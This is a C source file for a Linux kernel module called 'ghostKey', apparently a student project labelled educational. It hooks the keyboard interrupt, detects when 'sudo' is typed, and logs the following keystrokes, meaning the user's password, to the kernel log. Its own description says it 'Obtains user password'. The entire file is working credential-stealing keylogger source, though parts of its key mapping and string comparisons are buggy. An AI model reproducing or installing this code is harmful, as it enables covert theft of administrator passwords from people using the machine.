// |-----------------------------------------------------------------------------------|
// | Created by Kyle S. Welsh, Caden Perez, and Thomas Neumann                         |
// | Created under the education of Professor Yalong Wu of North Central College       |                                                                                  
// | Created during enrollment at North Central College, Naperville, IL                |
// |                                                                                   |             
// | For educational and defensive purposes only, should be used ethically             |
// |                                                                                   |
// | Note:                                                                             |
// | Initial education of interrupt services/key logging done online through Sam       |                                                                              
// | Protsenko of Kyiv, Ukraine                                                        |
// |                                                                                   |                                                                               
// | Sam Protsenko:                                                                    |
// | https://stackoverflow.com/questions/33836541/linux-kernel                         |
// | -how-to-capture-a-key-press-and-replace-it-with-another-key                       |
// | https://stackoverflow.com/users/3866447/sam-protsenko                             |
// |                                                                                   |
// | Other Resources Used:                                                             |
// | https://docs.huihoo.com/linux/kernel/2.6.26/genericirq/re09.html                  |
// | https://docs.huihoo.com/doxygen/linux/kernel/3.7/i8042-io_8h_source.html          |
// | https://android.googlesource.com/platform/external/kernel-headers/+/donut         |
// | -release/original/linux/interrupt.h#:~:text=*%20IRQF_SHARED%20%2D%20allow%        |
// | 20sharing%20the%20irq,%23define%20IRQF_DISABLED%200x00000020                      |
// | https://www.oreilly.com/library/view/linux-device-drivers/0596005903/ch10.html    |
// | https://www.systutorials.com/docs/linux/man/1-inb/                                |
// |-----------------------------------------------------------------------------------|

// MODULE AND KERNEL FUNCTIONALITY
#include <linux/kernel.h>
#include <linux/module.h>
// INTERRUPT CALLS
#include <linux/interrupt.h>
// INB()
#include <asm/io.h>
// TIME INCLUDES FOR INHUMANE KEY PRESSES
#include <linux/ktime.h>
#include <linux/timekeeping.h>
#include <linux/time.h>

// Interrupt line of keyboard
#define KEYBOARD_I8042 1
// Register to access for data of key presses
#define DATA_REGISTER 0x60
// Numbers to use with terinary operations to achieve statuses/values of keys
// Translates to: 0111 1111
#define KEY_PRESS_MASK 0x7f
// Translates to: 1000 0000
#define KEY_STATUS_MASK 0x80

// START : ALL CODE BELOW RELATED TO PASSWORD CHECKING AND VERIFICATION

// Checks for sudo command input to keyboard
bool check1 = false;
bool check2 = false;
bool check3 = false;
bool check4 = false;
// Needed for prints to print without messing up format
bool printedM1 = false;
bool printedM2 = true;
// Needed for one print for iteration / adding extra security to the prints
bool printedI = false;
// Represents when password tracking begins
bool record = false;

// END : PASSWORD CHECKING AND VERIFICATION FINISHED

// START : ALL CODE BELOW RELATED TO KEY PRESSES

// Integer values for specific key presses
int dataCodeValues[100];
// Lower and upper case keys parallel
char *lowercaseKeys[100][15];
char *uppercaseKeys[100][15];
// Shift and caps lock values
bool shiftPressed = false;
bool capsLockOn = false;

// END : CODE RELATED TO KEY PRESSES FINISHED

// START : ALL CODE BELOW RELATED TO LOWER LEVEL KEY PRESS HANDLING TIMES

// Time variables for inhumane key press bug
// (Inhumane Key Press Issue)
struct timespec64 time;
long int previousTime = 0;
long int currentTime = 0;
long int compareTime = 0;
char previousKey;
bool skip = false;

// Time variables for unrealisitc password time
// (Time Skip Issue)
long int printOne = 0;
long int printTwo = 0;
bool isPrintOne = true;
long long int printDifference = 0;

// Signal print once
long int previousSigPrint = 0;
long int currentSigPrint = 0;
long int differenceSigPrint = 0;

// CHANGE : CHANGE BASED ON MACHINE
// Relative inhumane speeds and signal issue times
// Testing must be done to get these numbers exactly correct
int bottomThresh = 40000000;
int signalThreshLow = -600000000;
int signalThreshHigh = 220000000;

// To see if print signal errors
bool active = false;

// END : LOWER LEVEL KEY PRESS HANDLING TIMES FINISHED

// Irqreturn_t is always the return type of an interrupt handler, which is what this
// function actually is, this allows us to obtain key values
static irqreturn_t ghostKey(int interruptRequest, void *developerID) {

	// Gets scan code values and assigns it to dataCode
	// inb() function allows us to access I/O ports
	char dataCode = inb(DATA_REGISTER);

	// Get current time
	ktime_get_real_ts64(&time);
	// Time calculations for time compares
	previousTime = currentTime;
	currentTime = time.tv_nsec;
	compareTime = currentTime - previousTime;
	// If key press/interrupt at inhumane time
	if ((dataCode == previousKey) && (compareTime < bottomThresh)) {
		skip = true;
	}

	// IF DELAY IS HUMANLY POSSIBLE
	if (!skip) {
		// IF PRESSED
		if(!(dataCode & KEY_STATUS_MASK)) {

			// LOOPS THROUGH DATA CODES TO FIND MATCH
			int i = 0;
			while(i <= 52 && !printedI) {
				if (dataCodeValues[i] == (dataCode & KEY_PRESS_MASK)) {
					if (check4 && (dataCode & KEY_PRESS_MASK) == 0x1c) {
						// RESET CHECKS
						check1 = false;
						check2 = false;
						check3 = false;

						// WHEN FINISHED RECORDING
						if (record) {
							record = false;
							check4 = false;
							printedM2 = false;
						}
						// BEGIN RECORDING
						else {
							record = true;
							printedM1 = false;
						}
					}

					// UPPER CASE (SHIFT KEY HELD OR CAPS LOCK)
					if ((shiftPressed && !capsLockOn) ||
							(!shiftPressed && capsLockOn)) {
						// RECORD KEY PRESSES AND PRINT
						if (!printedI)
						{
							printedI = true;
							if (record && (*uppercaseKeys[i] != (char*)"enter") && (*uppercaseKeys[i] != (char*)"lshift")
							&& (*uppercaseKeys[i] != (char*)"rshift") && (*uppercaseKeys[i] != (char*)"capson")
							&& (*uppercaseKeys[i] != (char*)"capsoff")) {
									// FIND TIME INBETWEEN LAST PRINT
									ktime_get_real_ts64(&time);
									if (isPrintOne) {
										printOne = time.tv_nsec;
										isPrintOne = false;
									}
									else {
										printTwo = time.tv_nsec;
										isPrintOne = true;
									}
									pr_info("%s\n", *uppercaseKeys[i]);
							}
						}
					}
					// LOWER CASE (NEITHER PRESSED OR BOTH PRESSED)
					else {
						// RECORD KEY PRESSES FOR SUDO
						if (check3) {
							if (*lowercaseKeys[i] == (char*)"o") {
								check4 = true;
							}
							else { check1 = false; check2 = false; check3 = false; }
						}
						if (check2) {
							if (*lowercaseKeys[i] == (char*)"d")
								check3 = true;
							else { check1 = false; check2 = false; }
						}
						if (check1) {
							if (*lowercaseKeys[i] == (char*)"u")
								check2 = true;
							else check1 = false;
						}
						if (*lowercaseKeys[i] == (char*)"s")
							check1 = true;

						// RECORD KEY PRESSES AND PRINT
						if (!printedI)
						{
							printedI = true;
							if (record && (*lowercaseKeys[i] != (char*)"enter") && (*uppercaseKeys[i] != (char*)"lshift")
							&& (*uppercaseKeys[i] != (char*)"rshift") && (*uppercaseKeys[i] != (char*)"capson")
							&& (*uppercaseKeys[i] != (char*)"capsoff")) {
									// FIND TIME INBETWEEN LAST PRINT
									ktime_get_real_ts64(&time);
									if (isPrintOne) {
										printOne = time.tv_nsec;
										isPrintOne = false;
									}
									else {
										printTwo = time.tv_nsec;
										isPrintOne = true;
									}
									pr_info("%s\n", *lowercaseKeys[i]);
							}
						}
					}
					// EXECUTE IF SHIFT KEY IS PRESSED
					if ((i == 46 || i == 47) && !shiftPressed)
						shiftPressed = true;
				}
				i++;
			}
		// IF RELEASED
		} else {
			// WHEN SHIFT KEY RELEASED
			if ((dataCode & KEY_PRESS_MASK) == 54 || (dataCode & KEY_PRESS_MASK) == 42) {
				shiftPressed = false;
			}
			// WHEN CAPS TURNED ON
			else if ((dataCode & KEY_PRESS_MASK) == dataCodeValues[48])
				capsLockOn = true;
			// WHEN CAPS TURNED off
			else if ((dataCode & KEY_PRESS_MASK) == dataCodeValues[49])
				capsLockOn = false;
		}
		
		// PRINT ONCE PER ITERATION
		printedI = false;

		// PRINT START AND FINISH
		if (record && !printedM1)
		{
			pr_info("START: Starting Password Recording ; Ready\n");
			printedM1 = true;
			active = true;
		}
		if (!record && !printedM2)
		{
			pr_info("END: Ending Password Recording ; Finished\n");
			printedM2 = true;
			active = false;
		}
	}

	if (active) {
		if ((dataCode != 0x36) && (dataCode != 0x2a)) {
			// Error check for unrelative lag time
			if (printOne != 0 && printTwo != 0) {
				// Calculate based on which one comes first
				if (isPrintOne) {
					printDifference = printTwo - printOne;
				}
				else {
					printDifference = printOne - printTwo;
				}
				// If glitch possible based on same key issue
				if ((dataCode == previousKey)) {
					// If not a normal key press : could be imporved upon by tracing users normal press time
					if (printDifference < signalThreshLow || printDifference > signalThreshHigh) {
							// Prints as many times as the key attempted to print given holding time
							pr_info("%s", "Signaling Error: Recent Key Malfunctioned.");
					}
				}
			}
		}
	}
	
	// Set for key compares
	previousKey = dataCode;
	// Reset skip value
	skip = false;

	// Return signal that IRQ is handled
	return IRQ_HANDLED;
}

// Function to be called only a signle time when the module is created
// The __init means that it is a function only used during ititilization
// This specific function will initilize spots in each array
// It is done this way for readibility purposes
static int __init ghostKeyInit(void) {

	// ' 1 2 ... ~ ! @
	dataCodeValues[0] = 0x01;   
	dataCodeValues[1] = 0x02;    
	dataCodeValues[2] = 0x03;
	lowercaseKeys[0][0] = "`";        
	lowercaseKeys[1][0] = "1";     
	lowercaseKeys[2][0] = "2";
	uppercaseKeys[0][0] = "~";        
	uppercaseKeys[1][0] = "!";        
	uppercaseKeys[2][0] = "@";
	
	// 3 4 5 ... # $ %
	dataCodeValues[3] = 0x04;    
	dataCodeValues[4] = 0x05;	
	dataCodeValues[5] = 0x06;
	lowercaseKeys[3][0] = "3";		  
	lowercaseKeys[4][0] = "4";		
	lowercaseKeys[5][0] = "5";
	uppercaseKeys[3][0] = "#";		  
	uppercaseKeys[4][0] = "$";		
	uppercaseKeys[5][0] = "%%";
	
	// 6 7 8 ... ^ & *
	dataCodeValues[6] = 0x07;	  
	dataCodeValues[7] = 0x08;	
	dataCodeValues[8] = 0x09;
	lowercaseKeys[6][0] = "6";		  
	lowercaseKeys[7][0] = "7";		
	lowercaseKeys[8][0] = "8";
	uppercaseKeys[6][0] = "^";		  
	uppercaseKeys[7][0] = "&";		
	uppercaseKeys[8][0] = "*";

	// 9 0 - ... ( ) _
	dataCodeValues[9] = 0x0a;	  
	dataCodeValues[10] = 0x0b;	
	dataCodeValues[11] = 0x0c;
	lowercaseKeys[9][0] = "9";		  
	lowercaseKeys[10][0] = "0";		
	lowercaseKeys[11][0] = "-";
	uppercaseKeys[9][0] = "(";		  
	uppercaseKeys[10][0] = ")";		
	uppercaseKeys[11][0] = "_";

	// = bks a ... + bks A
	dataCodeValues[12] = 0x0d;  
	dataCodeValues[13] = 0x0e;	
	dataCodeValues[14] = 0x1e;
	lowercaseKeys[12][0] = "=";		  
	lowercaseKeys[13][0] = "bks";		
	lowercaseKeys[14][0] = "a";
	uppercaseKeys[12][0] = "+";		  
	uppercaseKeys[13][0] = "bks";		
	uppercaseKeys[14][0] = "A";

	// b c d ... B C D
	dataCodeValues[15] = 0x30;	  
	dataCodeValues[16] = 0x2e;	
	dataCodeValues[17] = 0x20;
	lowercaseKeys[15][0] = "b";		  
	lowercaseKeys[16][0] = "c";		
	lowercaseKeys[17][0] = "d";
	uppercaseKeys[15][0] = "B";	      
	uppercaseKeys[16][0] = "C";		
	uppercaseKeys[17][0] = "D";

	// e f g ... E F G
	dataCodeValues[18] = 0x12;	  
	dataCodeValues[19] = 0x21; 	
	dataCodeValues[20] = 0x22;
	lowercaseKeys[18][0] = "e";		  
	lowercaseKeys[19][0] = "f";		
	lowercaseKeys[20][0] = "g";
	uppercaseKeys[18][0] = "E";		  
	uppercaseKeys[19][0] = "F";		
	uppercaseKeys[20][0] = "G";

	// h i j ... H I J
	dataCodeValues[21] = 0x23;	  
	dataCodeValues[22] = 0x17;	
	dataCodeValues[23] = 0x24;
	lowercaseKeys[21][0] = "h";		  
	lowercaseKeys[22][0] = "i";		
	lowercaseKeys[23][0] = "j";
	uppercaseKeys[21][0] = "H";	      
	uppercaseKeys[22][0] = "I";		
	uppercaseKeys[23][0] = "J";

	// k l m ... K L M
	dataCodeValues[24] = 0x25;	  
	dataCodeValues[25] = 0x26;	
	dataCodeValues[26] = 0x32;
	lowercaseKeys[24][0] = "k";		  
	lowercaseKeys[25][0] = "l";		
	lowercaseKeys[26][0] = "m";
	uppercaseKeys[24][0] = "K";		  
	uppercaseKeys[25][0] = "L";		
	uppercaseKeys[26][0] = "M";

	// n o p ... N O P
	dataCodeValues[27] = 0x31;   
	dataCodeValues[28] = 0x18;	
	dataCodeValues[29] = 0x19;
	lowercaseKeys[27][0] = "n";       
	lowercaseKeys[28][0] = "o";		
	lowercaseKeys[29][0] = "p";
	uppercaseKeys[27][0] = "N";       
	uppercaseKeys[28][0] = "O"; 		
	uppercaseKeys[29][0] = "P";

	// q r s ... Q R S
	dataCodeValues[30] = 0x10;	  
	dataCodeValues[31] = 0x13;	
	dataCodeValues[32] = 0x1f;
	lowercaseKeys[30][0] = "q";		  
	lowercaseKeys[31][0] = "r";		
	lowercaseKeys[32][0] = "s";
	uppercaseKeys[30][0] = "Q"; 	  
	uppercaseKeys[31][0] = "R"; 		
	uppercaseKeys[32][0] = "S";

	// t u v ... T U V
	dataCodeValues[33] = 0x14;	  
	dataCodeValues[34] = 0x16;	
	dataCodeValues[35] = 0x2f;
	lowercaseKeys[33][0] = "t";		  
	lowercaseKeys[34][0] = "u";		
	lowercaseKeys[35][0] = "v";
	uppercaseKeys[33][0] = "T";		  
	uppercaseKeys[34][0] = "U";		
	uppercaseKeys[35][0] = "V";

	// w x y ... W X Y
	dataCodeValues[36] = 0x11;	  
	dataCodeValues[37] = 0x2d;	
	dataCodeValues[38] = 0x15;
	lowercaseKeys[36][0] = "w";		  
	lowercaseKeys[37][0] = "x";		
	lowercaseKeys[38][0] = "y";
	uppercaseKeys[36][0] = "W";		  
	uppercaseKeys[37][0] = "X";		
	uppercaseKeys[38][0] = "Y";

	// z [ ] ... Z { }
	dataCodeValues[39] = 0x2c;	  
	dataCodeValues[40] = 0x1a;	
	dataCodeValues[41] = 0x1b;
	lowercaseKeys[39][0] = "z";		  
	lowercaseKeys[40][0] = "[";		
	lowercaseKeys[41][0] = "]";
	uppercaseKeys[39][0] = "Z";		  
	uppercaseKeys[40][0] = "{";		
	uppercaseKeys[41][0] = "}";

	// \ space , ... | space <
	dataCodeValues[42] = 0x2b;	  
	dataCodeValues[43] = 0x39;	
	dataCodeValues[44] = 0x33;
	lowercaseKeys[42][0] = "\\";	  
	lowercaseKeys[43][0] = "space";	
	lowercaseKeys[44][0] = ",";
	uppercaseKeys[42][0] = "|";		  
	uppercaseKeys[43][0] = "space";	
	uppercaseKeys[44][0] = "<";

	// . / rshift ... > ? rshift
	dataCodeValues[45] = 0x34;	  
	dataCodeValues[45] = 0x35;	
	dataCodeValues[46] = 0x36;
	lowercaseKeys[45][0] = ".";		  
	lowercaseKeys[45][0] = "/";		
	lowercaseKeys[46][0] = "rshift";
	uppercaseKeys[45][0] = ">";		  
	uppercaseKeys[45][0] = "?";		
	uppercaseKeys[46][0] = "rshift";

	// lshift capson capsoff ... lshift capson capsoff
	dataCodeValues[47] = 0x2a;	  
	dataCodeValues[48] = 0x3a;	
	dataCodeValues[49] = 0x7a;
	lowercaseKeys[47][0] = "lshift";  
	lowercaseKeys[48][0] = "capson";	
	lowercaseKeys[49][0] = "capsoff";
	uppercaseKeys[47][0] = "lshift";  
	uppercaseKeys[48][0] = "capson";	
	uppercaseKeys[49][0] = "capsoff";

	// ; ' enter ... : " enter
	dataCodeValues[50] = 0x27;	  
	dataCodeValues[51] = 0x28;	
	dataCodeValues[52] = 0x1c;
	lowercaseKeys[50][0] = ";";		  
	lowercaseKeys[51][0] = "\'";		
	lowercaseKeys[52][0] = "enter";
	uppercaseKeys[50][0] = ":";		  
	uppercaseKeys[51][0] = "\"";		
	uppercaseKeys[52][0] = "enter";

	// Set up interrupt handler
	// 1st parm is the interrupt line to allocate
	// 2nd parm is the function to call when the IRQ occurs
	// 3rd parm is to specify that the interrupt request is shared, so others can use it as well
	// 4th parm is the device name
	// 5th parm is device identity
	return request_irq(KEYBOARD_I8042, ghostKey, IRQF_SHARED, "ghostKey", (void *)ghostKey);
}

// Function to be called only a signle time when the module is being destroyed
// The __exit means that once it is called all data can be freed and used again
static void __exit ghostKeyExit(void) {

	// Free_irq called only on finish
	// 1st parm is the interrupt line to free
	// 2nd parm is device indentity to free
	free_irq(KEYBOARD_I8042, (void *)ghostKey);
}

// Module_init calls passed function on insertion
module_init(ghostKeyInit);

// Module_exit calls passed function on exit
module_exit(ghostKeyExit);

// Module Information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kyle S. Welsh, Caden Perez, Thomas Neumann");
MODULE_DESCRIPTION("Obtains user password and output its to stream.");
MODULE_SUPPORTED_DEVICE("English Keyboards");
MODULE_VERSION("1.0");
